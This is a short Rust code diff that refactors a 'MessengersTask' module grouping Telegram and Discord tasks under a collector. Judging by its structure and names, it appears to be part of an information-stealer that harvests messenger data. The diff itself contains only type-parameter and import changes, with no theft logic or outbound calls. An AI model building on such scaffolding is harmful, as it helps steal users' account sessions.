@@ -10,13 +10,14 @@ use crate::discord::DiscordTask;
 use crate::telegram::TelegramTask;
 use alloc::vec;
 use collector::Collector;
-use tasks::{CompositeTask, Task, composite_task, impl_composite_task_runner};
+use filesystem::FileSystem;
+use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
 
-pub struct MessengersTask<C: Collector> {
-    inner: CompositeTask<C>,
+pub struct MessengersTask<C: Collector, F: FileSystem> {
+    inner: CompositeTask<C, F>,
 }
 
-impl<C: Collector> Default for MessengersTask<C> {
+impl<C: Collector, F: FileSystem> Default for MessengersTask<C, F> {
     fn default() -> Self {
         Self {
             inner: composite_task!(TelegramTask, DiscordTask),
@@ -24,4 +25,4 @@ impl<C: Collector> Default for MessengersTask<C> {
     }
 }
 
-impl_composite_task_runner!(MessengersTask<C>, "Messengers");
+impl_composite_task_runner!(MessengersTask<C, F>, "Messengers");
